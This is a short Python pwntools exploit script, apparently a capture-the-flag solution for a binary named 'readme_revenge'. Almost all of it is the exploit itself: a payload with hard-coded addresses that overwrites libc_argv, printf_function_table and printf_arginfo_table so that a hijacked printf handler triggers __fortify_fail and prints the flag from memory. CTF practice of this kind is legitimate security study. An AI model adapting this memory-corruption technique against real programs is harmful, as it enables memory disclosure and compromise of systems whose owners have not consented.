#encoding:utf-8
from pwn import *
import os

context.arch='amd64'
context.log_level='debug'

io=process('./readme_revenge')
elf=ELF('./readme_revenge')

name = 0x6b73e0
libc_argv = 0x6b7980
printf_function_table = 0x6b7a28
printf_arginfo_table = 0x6b7aa8
flag = 0x6b4040
call_fortify_fail = 0x43599b

if __name__ == '__main__':
   pause()
   #so now we must create a fake array -- printf_arginfo_table
   # libc_argv - name = 0x6b7980-0x6b73e0 = 0x5a0
   payload = p64(flag)
   payload += '\x00'*(ord('s')*8-8)+p64(call_fortify_fail)
   payload = payload.ljust(0x5a0,'\x00')
   # overwrite **libc_argv to *flag
   payload += p64(name)
   # printf_function_table =1
   payload += '\x00'*(0x6b7a28-0x6b7980-8)+p64(1)
   # printf_arginfo_table = name 
   payload += '\x00'*(0x6b7aa8-0x6b7a28-8)+p64(name)
   
   io.sendline(payload)
   pause()
   print io.recv()

